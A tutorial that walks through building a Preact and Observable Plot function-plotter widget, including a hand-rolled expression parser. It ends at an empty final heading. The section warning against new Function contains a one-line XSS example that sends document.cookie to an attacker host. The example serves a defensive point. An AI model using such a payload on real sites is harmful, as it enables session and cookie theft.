# Building the Function Plotter

This is the first tutorial in the `tutorials/frontend/` track. The finished widget lives at [**function-plotter.widgets.beshir.org**](https://function-plotter.widgets.beshir.org) — type any expression in `x` and a live SVG curve appears on every keystroke, auto-scaled to the data. The tutorial covers Preact core, Vite, Observable Plot, a hand-rolled expression evaluator, and the `useEffect` pattern for integrating imperative DOM libraries. For the widget's visual treatment — colour scheme, typography, and card layout — see the [design tutorial](../design/01-function-plotter.md).

## What you'll build

The finished product lives at **https://function-plotter.widgets.beshir.org**. Open it and type `sin(x)` into the input field. An SVG curve appears instantly. Change the expression to `x^2 - 4` and the curve redraws — on every keystroke, no submit button, no round-trip. The y-axis rescales automatically to fit whatever the function produces.

The widget handles the full range of single-variable math: smooth curves (`sin(x)`), polynomials (`x^2 - 4`), vertical asymptotes (`1/x`), and complex envelopes (`exp(-x^2/4)*cos(x)`). The UI surfaces these as inline hints:

```tsx
// widgets/function-plotter/src/App.tsx:148-151
<p className="hint">
  Try expressions in <code>x</code> like <code>sin(x)</code>, <code>x^2 - 4</code>,{' '}
  <code>1/x</code>, <code>exp(-x^2/4)*cos(x)</code>.
</p>
```

### Three visible states

The widget is always in one of three states:

| State | What the user sees |
|---|---|
| **Valid expression** | SVG curve rendered, y-axis auto-scaled to the data |
| **Invalid expression** | Input field highlighted in red, plot area cleared |
| **Empty input** | Same as invalid — red highlight, no curve |

The `invalid` flag in the component (`fn === null`) drives both the `className="error"` on the input and the early-exit path that clears the plot host. There is no "loading" state because everything is computed locally in the browser — no network calls, no server.

### A static SPA in an iframe

The widget's metadata declares how it runs:

```json
// widgets/function-plotter/widget.json:3-5
"slug": "function-plotter",
"title": "Function Plotter",
"description": "Plot a user-supplied function of x as an SVG curve.",
```

`"slug"` is the routing key used by the widget host. `"description"` is the one-line summary that appears in indexes and embed previews.

The `"data": { "mode": "static" }` field (line 10) means the widget has no `dataSources` — it derives everything from user input at runtime. There are no API keys, no environment variables, no build-time data fetches. The entire computation happens on the user's device, which is why the widget can be hosted as a plain static file.

The widget is also designed to be dropped into any page as a single iframe:

```json
// widgets/function-plotter/widget.json:13-16
"embeddable": {
  "arbitraryParents": true,
  "recommendedIframe": "<iframe src=\"https://function-plotter.widgets.beshir.org\" loading=\"lazy\"></iframe>"
}
```

`arbitraryParents: true` means the widget makes no assumptions about its host — it works whether embedded on a blog, a dashboard, or a documentation site. The `loading="lazy"` attribute defers loading until the iframe scrolls into view.

### Why the iframe context matters for what follows

Running inside a sandboxed iframe has two consequences you'll see later in the tutorial. First, `window.resize` doesn't fire reliably when the embedding page reflows — only the iframe's own viewport notifies of size changes, and even that can miss programmatic layout shifts. That is why the widget uses `ResizeObserver` on the chart container element rather than a `window` event listener. Second, the embedding host needs a signal that the widget has actually painted something meaningful before it stops showing a loading placeholder. That signal is a hidden `<div id="widget-ready">` element that the widget adds to the DOM only after the first plot renders — a convention covered in the Initialisation section.

The two library choices that make this possible are the subject of the next section.

## The stack and why

The two library choices in this widget — Preact and Observable Plot — are documented repo defaults, not arbitrary decisions. Understanding the reasoning means you can intentionally deviate when the next widget calls for it.

### Preact core

Preact is a ~3 KB (minified + gzip) hook-compatible alternative to React+ReactDOM (~36 KB combined). It reaches that footprint by using the browser's native DOM APIs directly: event listeners are attached via `addEventListener` and native DOM events fire as-is, with no synthetic abstraction layer normalising browser differences. The hook API — `useState`, `useEffect`, `useMemo`, `useRef`, and friends — is intentionally identical to React's, imported from `preact/hooks`. Component files read exactly like React hooks code to a developer familiar with the model.

`preact/compat` exists as an optional thin shim that aliases Preact's internals to React's public API, letting React-ecosystem packages that `import from 'react'` work unchanged. This widget imports everything directly from `'preact'` and `'preact/hooks'` — no compat layer, because there are no React-only dependencies to bridge.

The `README.md` makes Preact the repo default:

```md
- **Runtime: Preact core** (not React). Tiny, framework-agnostic libraries pair well with it; React-only packages should generally be avoided unless they justify the `preact/compat` cost.
- **Charts: Observable Plot** (`@observablehq/plot`) as the default for chart-like widgets — grammar-of-graphics, SVG output, no CDN required.
```

`README.md:19-20`

### Two runtime dependencies

Open `widgets/function-plotter/package.json`. There are exactly two runtime dependencies:

```json
"dependencies": {
  "@observablehq/plot": "^0.6.17",
  "preact": "^10.27.2"
},
```

`widgets/function-plotter/package.json:11-14`

Everything else — Vite, TypeScript, the preset plugin — lives in `devDependencies` and is absent from the shipped bundle.

### Vite configuration

```ts
import { defineConfig } from 'vite';
import preact from '@preact/preset-vite';

export default defineConfig({
  base: './',
  plugins: [preact()],
});
```

`widgets/function-plotter/vite.config.ts:1-7`

`@preact/preset-vite` does one thing that matters: it tells Vite's esbuild transform to emit Preact JSX (`jsxImportSource: "preact"`) rather than React JSX. Without it, JSX compiles to `React.createElement` calls and the import fails at runtime. With it, JSX compiles to Preact's `h()` calls — no pragma comments required. Preact DevTools and Fast Refresh also wire up in development automatically.

### Observable Plot

`LIBRARIES.md`'s "How To Choose" section grounds the decision to use Observable Plot:

```md
1. **Pick the tool that produces the best widget.** Optimize for the result — clarity, polish, correctness, building it well — not for the smallest bundle. For chart-like widgets that default is **Preact core + Observable Plot**.
2. **Don't optimize for size.** Treat **~400 KB gzip** as a comfortable ceiling — below it, don't think about size at all. ...
3. **For chart-like widgets, start with Observable Plot.** uPlot for dense time-series, Chart.js for conventional canvas charts, ECharts (modular) for rich dashboards. ...
```

`LIBRARIES.md:85-87`

Observable Plot follows a grammar-of-graphics model: you declare marks (lines, rules, areas), scales, and layout options, and Plot assembles the SVG. It ships its own SVG renderer — no CDN link, no script tag, just an npm import — and bundles cleanly with Vite. At 135 KB gzip, it sits comfortably inside the repo's ~400 KB ceiling, which the policy treats as a relaxed upper bound rather than a target to minimise toward.

One structural detail that shapes how you use Observable Plot: **`Plot.plot()` returns a real DOM node** — an `SVGSVGElement` or `HTMLElement` — not a Preact component or virtual DOM node. You cannot return it from a JSX expression. It must be inserted imperatively into a container the component owns, via a `ref`, and removed when the effect cleans up. That is the reason it needs `useEffect` integration rather than a simple JSX return; the Effects section covers the full pattern.

One consequence of Preact's direct-to-DOM event model will matter when we wire up the expression input in the State section: `onChange` on a Preact `<input>` fires on blur (the native `change` event), not on every keystroke — `onInput` is the correct handler for live, per-character updates.

With the stack settled, the next section walks through the widget's three-layer boot sequence.

## Initialisation

The widget boots in three layers. Understanding each one explains why the code is structured the way it is.

### The HTML entry point

`index.html` is the document Vite serves as the page root. It does two things that matter:

```html
<!-- widgets/function-plotter/index.html:9-10 -->
    <div id="root"></div>
    <script type="module" src="/src/main.tsx"></script>
```

The `<div id="root">` is the only mount point Preact needs — an empty container the framework will own entirely. The `type="module"` attribute tells the browser to load `main.tsx` as a native ES module, which means it gets deferred execution (runs after HTML parsing), strict mode, and its own module scope. Vite intercepts the request at dev time to transpile TypeScript and JSX; in production a bundled `main.js` takes the same slot.

### Mounting the component tree

`main.tsx` is the entire bridge between the HTML page and the Preact world:

```tsx
// widgets/function-plotter/src/main.tsx:1-6
import { render } from 'preact';
import { App } from './App';
import './styles.css';

const root = document.getElementById('root');
if (root) render(<App />, root);
```

`render` from `'preact'` is a synchronous, one-shot call. It walks the virtual DOM tree `<App />` produces, creates the real DOM nodes, and inserts them into `root` — all in one blocking step. This is intentionally simpler than React 18's `createRoot().render()`, which schedules work across multiple frames to support concurrent features (Suspense boundaries, `startTransition`, interruptible renders). Preact has none of that machinery; rendering is eager and complete before `render()` returns. For a widget that draws a plot, the simplicity is a feature: there is no scheduler to reason about, no priority lanes, no tearing.

The null-guard (`if (root)`) is there because `getElementById` can return `null` if the DOM isn't what you expect. In a Vite-served page it always finds the element, but TypeScript requires the check.

### The `#widget-ready` marker

After `render()` returns, `App` is mounted — but "mounted" does not mean "meaningfully painted." The component tree is in the DOM, but Observable Plot hasn't run yet; the plot SVG is built inside a `useEffect` that fires after the first browser paint. An embedding host (or the CI render check) that starts scraping the widget the moment the iframe loads would see an empty plot container.

The solution is a hidden sentinel element that only appears once the widget has something real to show:

```tsx
// widgets/function-plotter/src/App.tsx:55
  const [ready, setReady] = useState(false);
```

```tsx
// widgets/function-plotter/src/App.tsx:177
      {ready && <div id="widget-ready" data-ready="true" hidden />}
```

`useState(false)` creates a boolean flag that starts `false` and causes a re-render when it flips to `true`. The JSX conditional `{ready && …}` means the `<div id="widget-ready">` element simply does not exist in the DOM until `ready` is `true`. Because it carries `hidden`, it is invisible even when present — it is a signal, not UI.

`LIBRARIES.md` states the rule directly (line 91):

> Set the `#widget-ready` marker only after first meaningful paint, including async WASM, fonts, or layout work.

`ready` becomes `true` inside the plot `useEffect` — either after the Plot SVG has been inserted into the DOM, or after the early-return path that handles an empty or invalid expression (which also counts as "the widget has run and there is nothing to show"). Either way, the marker only appears after the effect has executed at least once, which is after the first paint. The host can safely poll for `document.getElementById('widget-ready')` without risking a false positive.

The actual call to `setReady(true)` lives in the Effects section — that section covers `useEffect` in full, so the mechanics are explained there. Here, the key point is the intent: `ready` is not about component state in the data-flow sense; it is a one-way latch whose only job is to tell the outside world "first meaningful render has happened."

Once mounted, the component needs state. The next section traces the data from a single `useState` call through to the chart's y-domain.

## State and data flow

The entire widget's state surface is three `useState` calls:

```tsx
// widgets/function-plotter/src/App.tsx:54-56
const [expr, setExpr] = useState('sin(x)');
const [ready, setReady] = useState(false);
const [width, setWidth] = useState(720);
```

`expr` is the only one that comes from user input. `ready` and `width` are owned by effects (covered in the Effects section). Everything else — the compiled function, the sample array, the y-axis domain — is *derived*.

### Why derive instead of store

The temptation when you have `expr` is to also store the compiled function in state so you can "keep it around." Don't. When you mirror derived data into state you pay three costs:

1. **An extra render cycle.** If you put `fn` in state and update it inside a `useEffect`, the sequence is: render → effect fires → `setFn(...)` → second render. `useMemo` produces the value synchronously during the *same* render pass — one round-trip, not two.

2. **A window of inconsistency.** Between the first render (where `expr` has changed) and the effect that updates `fn`, those two pieces of state disagree. `useMemo` never disagrees because it evaluates in the same render.

3. **Unstable references break downstream deps.** If you computed `fn` as a plain variable inside the render body (no memo), it would be a new function reference on every render even when `expr` hasn't changed. The `samples` memo depends on `fn`; if `fn` looks "new" on every render, `samples` recomputes on every render too, regardless of whether the expression changed.

### The chain

```tsx
// widgets/function-plotter/src/App.tsx:60-68
const fn = useMemo(() => compileExpr(expr), [expr]);
const invalid = fn === null;

const samples = useMemo(() => {
  if (!fn) return [] as Sample[];
  return sampleFunction(fn);
}, [fn]);

const yDomain = useMemo(() => computeYDomain(samples), [samples]);
```

Each memo's dependency array contains exactly the output of the previous step. The types make the pipeline explicit:

```
expr: string
  → fn: ((x: number) => number) | null
  → samples: Sample[]
  → yDomain: [number, number]
```

When `expr` changes, only `fn` recomputes first. Because `fn` is a new reference (or `null`), `samples` recomputes. Because `samples` is a new array reference, `yDomain` recomputes. Nothing downstream of `yDomain` — the effect that repaints the chart — runs until the render is complete.

The referential stability guarantee flows both ways: if the user types the same expression twice, `compileExpr` returns a functionally equivalent function but a *new* object, so `fn` changes and the chain re-runs. That's correct — the memo chain re-evaluates when the expression text changes, and stays cached when it doesn't.

### The controlled input

```tsx
// widgets/function-plotter/src/App.tsx:156-160
<input
  id="expr-input"
  type="text"
  value={expr}
  onInput={(e) => setExpr((e.target as HTMLInputElement).value)}
```

`value={expr}` makes the input *controlled*: Preact sets the DOM input's value to match `expr` on every render. The `onInput` handler feeds user keystrokes back into state via `setExpr`, completing the loop.

**A real trap for developers coming from React:** you might write `onChange` here instead of `onInput`. In React, `onChange` on an `<input>` fires on every keystroke — React remaps it to the native `input` event under the hood. In Preact core there is no synthetic event system; event props map directly to native DOM `addEventListener` calls. The native `change` event fires only when the field *loses focus*. With `onChange`, the expression would only recompile when the user tabs away from the input — a subtle, frustrating bug.

`onInput` maps to the native `input` event, which fires on every keystroke. That's what you want. `preact/compat` fixes this for you automatically, but this widget imports from `preact` directly and does not use `preact/compat`.

### Propagation walkthrough

A single keystroke triggers this sequence:

1. Native `input` event fires on the `<input>` element.
2. `onInput` handler calls `setExpr(newValue)`.
3. Preact schedules a re-render of `App`.
4. During re-render, `useMemo` for `fn` sees `expr` changed → calls `compileExpr` → new `fn`.
5. `useMemo` for `samples` sees `fn` changed → calls `sampleFunction` → new `Sample[]`.
6. `useMemo` for `yDomain` sees `samples` changed → calls `computeYDomain` → new `[number, number]`.
7. The render returns updated JSX with the new `invalid` flag applied as the `error` CSS class on the input.
8. After paint, the chart effect re-runs with the new `samples` and `yDomain` — that's the Effects section.

The `invalid` flag on line 61 (`const invalid = fn === null`) drives the error state immediately — no effect needed, no async step. If `compileExpr` returns `null`, the input gets `className="error"` and the error message renders in the same pass.

### The `useRef` declarations

```tsx
// widgets/function-plotter/src/App.tsx:57-58
const hostRef = useRef<HTMLDivElement>(null);
const containerRef = useRef<HTMLDivElement>(null);
```

These are declared here alongside the state but aren't used yet — they're DOM handles that the effects need. A `useRef` value persists across renders without triggering re-renders, and Preact populates `.current` with the actual DOM node after the component mounts, before any `useEffect` fires.

The `compileExpr` call at the heart of that first `useMemo` lives in `evaluator.ts` — the subject of the next section.

## Domain logic: turning a string into f(x)

The user types `"sin(x^2)"`. Before Observable Plot can sample any points, that string needs to become a callable JavaScript function. `evaluator.ts` does this work in three sequential phases — tokenize, reorder, evaluate — and exposes a single export that hides all three.

### Why not `eval` or `new Function`?

The shortest path would be:

```js
const fn = new Function('x', `return ${userExpr}`);
```

Don't. `new Function` executes its string body in the global scope with full access to every browser global: `document`, `fetch`, `localStorage`, `location`. A user typing `fetch('https://attacker.com?c='+document.cookie)` as their "expression" is full XSS — not a theoretical risk but a one-liner. There's also no sensible error contract: it throws on syntax errors but lets semantically wrong input through, and it re-parses the string on every call.

The hand-rolled parser gives the opposite contract: returns `null` for anything it doesn't understand, and that `null` is exactly what drives the error UI in the component.

### The module boundary

`evaluator.ts` imports nothing — no Preact, no Plot, no utilities. It exports one function. That isolation is deliberate: the module is pure and stateless, which means it can be tested with `node` directly without spinning up a component tree, and `compileExpr` compiles the expression once at edit time, returning a closure that gets reused for every sample point. The `useMemo` in the component that calls `compileExpr` depends on this: the returned `(x: number) => number` is stable across renders as long as the expression string doesn't change.

### Phase 1 — Tokenize

`tokenize` scans the input left-to-right, classifying each character run into a typed token. What it recognises is defined by four tables at the top of the file:

```ts
const FUNC_NAMES = new Set(['sin', 'cos', 'tan', 'exp', 'log', 'ln', 'sqrt', 'abs']);
const CONST_VALUES: Record<string, number> = { pi: Math.PI, e: Math.E };

const OP_PREC: Record<string, number> = {
  '+': 1, '-': 1, '*': 2, '/': 2, '^': 3, '__neg__': 4,
};
const RIGHT_ASSOC = new Set(['^', '__neg__']);
```
`widgets/function-plotter/src/evaluator.ts:16-22`

Any identifier that isn't `x`, a key of `CONST_VALUES`, or a member of `FUNC_NAMES` causes an immediate `return null` — unknown identifiers are the primary source of the "expression → null" path that clears the plot.

After the main scan there's a second pass for **unary minus**. A `-` token is ambiguous: in `3 - 1` it's binary subtraction; in `-x` or `sin(-x)` it's negation. The rule is positional:

```ts
const prev = result[result.length - 1];
const isUnary = !prev || prev.kind === 'op' || prev.kind === 'lparen' || prev.kind === 'func';
result.push(isUnary ? { kind: 'op', val: '__neg__' } : tok);
```
`widgets/function-plotter/src/evaluator.ts:78-80`

A `-` is unary when it appears at the start (no `prev`), immediately after another operator, after a `(`, or after a function name. In those positions it becomes the synthetic operator `__neg__`, which has precedence 4 and is right-associative — the same level as `^`. That precedence pairing is intentional: `-x^2` should evaluate as `-(x^2)`, not `(-x)^2`, which is mathematically correct and matches what Python and most calculators do. Right-associativity of `__neg__` in `RIGHT_ASSOC` ensures the shunting-yard step handles it correctly.

### Phase 2 — Shunting-yard (infix → RPN)

Infix notation is how humans write expressions — `a + b * c` — with the operator sitting between its operands. **Reverse Polish Notation (RPN)** puts operators after their operands — `a b c * +`. The advantage of RPN is that it needs no parentheses and can be evaluated by a simple left-to-right scan with a stack, with no precedence lookups required at evaluation time.

**Dijkstra's shunting-yard algorithm** converts infix to RPN using an operator stack. The core rule when encountering an operator `o1`: pop any operator `o2` from the stack to the output queue while `o2` has strictly higher precedence than `o1`, *or* equal precedence and `o1` is left-associative. Then push `o1`.

```ts
      const opPrec = OP_PREC[tok.val] ?? 0;
      while (ops.length > 0) {
        const top = ops[ops.length - 1];
        if (top === 'LPAREN') break;
        const topPrec = top.startsWith('F:') ? 10 : (OP_PREC[top] ?? 0);
        if (topPrec > opPrec || (topPrec === opPrec && !RIGHT_ASSOC.has(tok.val))) {
          ops.pop();
          if (top.startsWith('F:')) output.push({ t: 'func', v: top.slice(2) });
          else output.push({ t: 'op', v: top });
        } else {
          break;
        }
      }
      ops.push(tok.val);
```
`widgets/function-plotter/src/evaluator.ts:117-130`

The `!RIGHT_ASSOC.has(tok.val)` guard is what makes `^` right-associative: when `o1 = '^'` and the stack top is also `'^'`, equal precedence + right-associative means *don't* pop — stack the new `^` on top. This produces `a^(b^c)` rather than `(a^b)^c`.

Functions (`sin`, `cos`, etc.) are pushed to the operator stack with a `'F:'` prefix and a virtual precedence of 10, so they are always popped before normal operators when a `)` is encountered.

Mismatched parentheses (`return null` at two points in `toRPN`) are another source of the null contract.

### Phase 3 — RPN evaluation

`evalRPN` walks the RPN array once per x-value, maintaining a numeric stack:

```ts
function evalRPN(rpn: RPNItem[], x: number): number {
  const stack: number[] = [];

  for (const item of rpn) {
    if (item.t === 'num') {
      stack.push(item.v);
    } else if (item.t === 'var') {
      stack.push(x);
    } else if (item.t === 'op') {
      if (item.v === '__neg__') {
        const a = stack.pop();
        if (a === undefined) return NaN;
        stack.push(-a);
      } else {
        const b = stack.pop();
        const a = stack.pop();
        if (a === undefined || b === undefined) return NaN;
        switch (item.v) {
          case '+': stack.push(a + b); break;
          case '-': stack.push(a - b); break;
          case '*': stack.push(a * b); break;
          case '/': stack.push(a / b); break;
          case '^': stack.push(Math.pow(a, b)); break;
          default: return NaN;
        }
      }
    } else if (item.t === 'func') {
      const a = stack.pop();
      if (a === undefined) return NaN;
      switch (item.v) {
        case 'sin':  stack.push(Math.sin(a)); break;
        case 'cos':  stack.push(Math.cos(a)); break;
        case 'tan':  stack.push(Math.tan(a)); break;
        case 'exp':  stack.push(Math.exp(a)); break;
        case 'log':  stack.push(Math.log10(a)); break;
        case 'ln':   stack.push(Math.log(a)); break;
        case 'sqrt': stack.push(Math.sqrt(a)); break;
        case 'abs':  stack.push(Math.abs(a)); break;
        default: return NaN;
      }
    }
  }

  if (stack.length !== 1) return NaN;
  return stack[0];
}
```
`widgets/function-plotter/src/evaluator.ts:144-189`

Numbers and constants push their value. `var` pushes the current `x` argument — the only thing that changes between sample points. Operators pop their operands, compute, and push the result. An ill-formed RPN (wrong number of operands) produces `NaN` rather than throwing.

### Walking `sin(x)` end-to-end

Input: `"sin(x)"`

**Tokenize:** `func:sin`, `lparen`, `var`, `rparen` — all four are recognised; no unary minus pass needed.

**Shunting-yard:**
1. `func:sin` → pushed to operator stack as `'F:sin'`.
2. `lparen` → pushed as `'LPAREN'`.
3. `var` → emitted directly to output: `output = [{t:'var'}]`.
4. `rparen` → pop until `LPAREN`: stack top is `'LPAREN'` immediately, so nothing pops. Discard `LPAREN`. Stack top is now `'F:sin'`, so pop it to output: `output = [{t:'var'}, {t:'func',v:'sin'}]`.

**RPN queue:** `[{t:'var'}, {t:'func', v:'sin'}]`

**Evaluate at x = π/2 ≈ 1.5708:**
1. `var` → push `1.5708`. Stack: `[1.5708]`.
2. `func:sin` → pop `1.5708`, push `Math.sin(1.5708)` ≈ `1.0`. Stack: `[1.0]`.
3. Stack has exactly one element → return `1.0`. ✓

### The public interface

All three phases are hidden behind a single exported function:

```ts
export function compileExpr(expr: string): ((x: number) => number) | null {
  try {
    const tokens = tokenize(expr.trim());
    if (tokens === null || tokens.length === 0) return null;
    const rpn = toRPN(tokens);
    if (rpn === null || rpn.length === 0) return null;
    return (x: number) => evalRPN(rpn, x);
  } catch {
    return null;
  }
}
```
`widgets/function-plotter/src/evaluator.ts:191-201`

The returned closure captures `rpn` — the pre-compiled RPN array. Calling it with different `x` values doesn't re-tokenize or re-run shunting-yard; `evalRPN` is the only work per sample point. With 480 sample points per render, this matters.

The outer `try/catch` is a belt-and-suspenders guard for unexpected edge cases; the inner `null` checks are the primary error path.

> **Library alternative:** `expr-eval` (~8 KB gzipped) provides the same contract — `parser.parse(expr).toJSFunction('x')` — without hand-rolling the three phases. It's a reasonable choice for a production widget where teaching the pipeline isn't the goal. Here, the explicit tokenizer and shunting-yard pass make each concern inspectable and independently testable.

With a callable `(x: number) => number` in hand, the next section shows how Observable Plot turns those samples into a chart and how effects integrate the imperative library into the Preact component lifecycle.

## Effects and imperative integration

Observable Plot doesn't produce JSX or virtual DOM nodes — `Plot.plot()` returns a real `SVGSVGElement`, a live browser DOM node. That means you can't return it from `render()` the way you would a `<div>`. You have to insert it into the document yourself, after Preact has committed the component tree to the DOM.

That's exactly what `useEffect` is for.

### The ref-as-container pattern

The two refs declared alongside the state — `hostRef` for the inner `<div class="plot-host">` where the Plot SVG gets mounted, and `containerRef` for the outer `<div class="plot-wrap">` that the `ResizeObserver` watches — are `null` during render and become live DOM handles the moment Preact commits the tree. By the time any `useEffect` fires, `hostRef.current` is the real `<div>`, not `null`. That ordering guarantee is why DOM mutation belongs in effects: the node you want to insert into doesn't exist yet during render.

---

### The mount effect

The second `useEffect` in `App` owns the Plot SVG's lifetime. It runs after every change to the things the chart depends on, and its cleanup function removes the old SVG before the next one goes in.

#### The guard: fewer than two samples

```tsx
// widgets/function-plotter/src/App.tsx:85-93
useEffect(() => {
  const host = hostRef.current;
  if (!host) return;

  if (samples.length < 2) {
    host.replaceChildren();
    if (!ready) setReady(true);
    return;
  }
```

Before touching Plot at all, the effect checks `samples`. A single point or an empty array cannot form a line, so the effect clears the host and bails early. It also sets `ready` here — the `#widget-ready` marker appears after _either_ the chart is drawn _or_ the expression is invalid and the plot is cleared. Both are valid "first meaningful paint" states. The `if (!ready)` guard prevents calling `setReady(true)` on subsequent runs.

#### Building the chart

```tsx
// widgets/function-plotter/src/App.tsx:95-107
const node = Plot.plot({
  width,
  height: Math.max(260, Math.round(width * 0.55)),
  marginLeft: 52,
  marginBottom: 40,
  marginRight: 18,
  marginTop: 18,
  style: {
    background: 'transparent',
    color: 'var(--fg)',
    fontFamily: 'inherit',
    fontSize: '12px',
  },
```

`Plot.plot()` takes a plain options object and returns the SVG. The `width` value is the measured pixel width that flows in from the `ResizeObserver` effect (see below). `height` is derived from `width` — the chart maintains a roughly 16:9 aspect ratio with a floor of 260 px.

The `style` option is applied to the SVG root element directly. Using CSS custom properties (`var(--fg)`, `var(--curve)`) keeps the chart theme-aware: the host page can redefine them without touching any JavaScript.

#### Scales

```tsx
// widgets/function-plotter/src/App.tsx:108-119
  x: {
    domain: [X_MIN, X_MAX],
    label: 'x →',
    grid: true,
    nice: true,
  },
  y: {
    domain: yDomain,
    label: '↑ f(x)',
    grid: true,
    nice: true,
  },
```

`domain` sets the visible range. The x-domain is fixed at `[-10, 10]` (constants `X_MIN` / `X_MAX` defined at the top of the file). The y-domain comes from `computeYDomain`, which scans the sample array, pads by 8%, and handles edge cases like a flat function or an empty sample set — more on that in the segmentation section.

`grid: true` draws faint guide lines at each tick. `nice: true` nudges the domain endpoints to round numbers so tick labels fall cleanly. `label` appears as the axis annotation. Arrow characters in the labels are an Observable Plot convention for pointing along the axis direction.

#### Marks: rules and the curve

```tsx
// widgets/function-plotter/src/App.tsx:120-132
  marks: [
    Plot.ruleX([0], { stroke: 'var(--axis)', strokeWidth: 1 }),
    Plot.ruleY([0], { stroke: 'var(--axis)', strokeWidth: 1 }),
    Plot.line(samples, {
      x: 'x',
      y: 'y',
      z: 'seg',
      stroke: 'var(--curve)',
      strokeWidth: 2,
      strokeLinecap: 'round',
      strokeLinejoin: 'round',
    }),
  ],
```

`Plot.ruleX([0])` draws a vertical line at x = 0 spanning the full y-extent — the y-axis. `Plot.ruleY([0])` draws a horizontal line at y = 0 spanning the full x-extent — the x-axis. Passing `[0]` (an array containing the single value zero) tells Plot to draw one rule at that position. Without these, the chart has grid lines but no visible zero crossing.

`Plot.line(samples, ...)` draws the function curve. The `x` and `y` options are string field names that Plot uses to read each sample object. The `z: 'seg'` option is the segmentation mechanism — explained in detail below.

#### Atomic swap and cleanup

```tsx
// widgets/function-plotter/src/App.tsx:135-141
  host.replaceChildren(node);
  if (!ready) setReady(true);

  return () => {
    node.remove();
  };
}, [samples, yDomain, width, ready]);
```

`host.replaceChildren(node)` atomically removes whatever children the host currently has and inserts the new SVG as the sole child. This is a single DOM operation — there's no intermediate empty state, no `innerHTML` string parsing, no XSS surface. The old SVG is gone and the new one is in, in one call.

The returned function is the effect's cleanup. Before the effect re-runs on the next change, Preact calls this function: `node.remove()` detaches the previous SVG from the DOM. Without this, you'd accumulate orphaned SVGs in the host div.

The dependency array `[samples, yDomain, width, ready]` lists every value the effect reads. When any of them changes — new expression, new y-domain, resized container — the effect re-runs: cleanup fires to remove the old SVG, then the body fires to build and insert a new one.

One dep deserves a note: `ready` appears here not because the chart must rebuild when `ready` flips. It appears because the effect body *reads* `ready` — `if (!ready) setReady(true)` — and the exhaustive-deps lint rule requires every accessed value to be listed. In practice, once `ready` becomes `true` it stays `true`, so this dep only triggers an extra run once, on the first successful render.

---

### `z: 'seg'` — breaking the curve at discontinuities

Without segmentation, `tan(x)` near x = π/2 would shoot from around +1000 to −1000 in a single step, and Observable Plot would connect those two adjacent points with a near-vertical spike across the entire chart. `z: 'seg'` prevents that.

When `Plot.line` sees a `z` channel, it groups the data by `z` value and draws each group as a **separate polyline**. Points in different groups are never connected. A new value of `z` is a hard break in the line.

The `sampleFunction` helper builds the `seg` counter:

```tsx
// widgets/function-plotter/src/App.tsx:20-28
  const finite = Number.isFinite(y) && Math.abs(y) < Y_CLAMP;
  if (!finite) {
    prevFinite = false;
    continue;
  }
  // Split into a new segment on discontinuity jumps (very large step between adjacent samples).
  if (prevFinite && Math.abs(y - prevY) > 50) {
    seg++;
  }
```

There are two distinct mechanisms here:

**1. Skip non-finite values entirely.** If `y` is `Infinity`, `-Infinity`, `NaN`, or exceeds `Y_CLAMP` (10⁶), the sample is dropped from the output array with `continue`. It leaves no point at all in `samples`, so there's nothing for Plot to draw there. The `prevFinite = false` bookkeeping means that when the next finite sample arrives, the code won't try to measure a jump from the last good point.

**2. Split on large finite jumps.** Near an asymptote, floating-point arithmetic produces large but technically-finite values. `Math.tan(1.5707)` evaluates to about 158,000, not `Infinity`. If the next x-step lands on the other side of the asymptote at −158,000, the magnitude of that jump — `|y - prevY| > 50` — triggers `seg++`. The two finite runs end up in different segments and Plot draws them as two separate lines with a gap in between.

The threshold of 50 is a deliberate choice: larger than any smooth curve would jump between adjacent samples at 480-sample resolution over `[-10, 10]`, but small enough to catch a genuine asymptote crossing.

`computeYDomain` feeds the y scale's `domain` option:

```tsx
// widgets/function-plotter/src/App.tsx:36-51
function computeYDomain(samples: Sample[]): [number, number] {
  if (samples.length === 0) return [-10, 10];
  let yMin = Infinity;
  let yMax = -Infinity;
  for (const s of samples) {
    if (s.y < yMin) yMin = s.y;
    if (s.y > yMax) yMax = s.y;
  }
  if (!Number.isFinite(yMin) || !Number.isFinite(yMax)) return [-10, 10];
  if (yMin === yMax) {
    yMin -= 5;
    yMax += 5;
  }
  const pad = (yMax - yMin) * 0.08;
  return [yMin - pad, yMax + pad];
}
```

Because `samples` already has non-finite values stripped, `yMin` and `yMax` are derived purely from plottable points. The 8% padding prevents the curve from touching the top or bottom edge of the SVG, and the flat-function guard (`yMin === yMax`) expands a horizontal line by ±5 so it doesn't collapse to a pixel.

---

### The ResizeObserver effect

The chart needs a pixel width to pass to `Plot.plot()`. CSS alone isn't enough — setting `style: { width: '100%' }` on the SVG changes its CSS width but doesn't tell Plot the actual pixel count, so tick density and label placement would be computed for the default 640 px regardless of the real container size.

The solution is a separate effect that measures the container and writes `width` into state:

```tsx
// widgets/function-plotter/src/App.tsx:71-82
useEffect(() => {
  const el = containerRef.current;
  if (!el) return;
  const ro = new ResizeObserver((entries) => {
    for (const entry of entries) {
      const w = Math.max(280, Math.floor(entry.contentRect.width));
      setWidth((prev) => (Math.abs(prev - w) > 2 ? w : prev));
    }
  });
  ro.observe(el);
  return () => ro.disconnect();
}, []);
```

This effect has an empty dependency array — it runs once on mount, attaches the observer to the stable container ref, and never re-runs. The cleanup `ro.disconnect()` removes the observer when the component unmounts.

**Why `ResizeObserver` and not `window.resize`?**

`window.resize` fires when the browser viewport resizes. Inside an iframe, the iframe's content window has its own viewport, and that viewport may stay the same size even as the iframe's layout dimensions change — for example, if the host page runs a panel resize. More importantly, `window.resize` never fires for CSS-driven layout changes: a flex container compressing, a sidebar appearing, a font load shifting columns. `ResizeObserver` observes the content box of the element directly and fires for *any* cause of size change, regardless of whether it involved a user gesture or window resize.

`entry.contentRect.width` is the content-box width — padding and border excluded. That's the dimension to pass to Plot, since Plot's internal layout arithmetic works in content-box space.

**The threshold guard:**

```tsx
setWidth((prev) => (Math.abs(prev - w) > 2 ? w : prev));
```

`ResizeObserver` can fire on every animation frame during a continuous drag. Without a threshold, each fire would call `setWidth`, which would trigger a re-render, which would run the plot effect, which would rebuild the SVG — every frame. The `> 2` check silences sub-pixel noise: if the measured width is within 2 pixels of the current value, `setWidth` returns the previous state unchanged and no re-render is scheduled. The functional updater form (`prev => ...`) is used here specifically because the callback closes over a potentially-stale outer scope; the updater always receives the current state.

When a meaningful resize does occur, `setWidth` triggers a re-render. The mount effect has `width` in its dependency array, so it rebuilds the plot at the new pixel size on the next tick.

## Putting it together

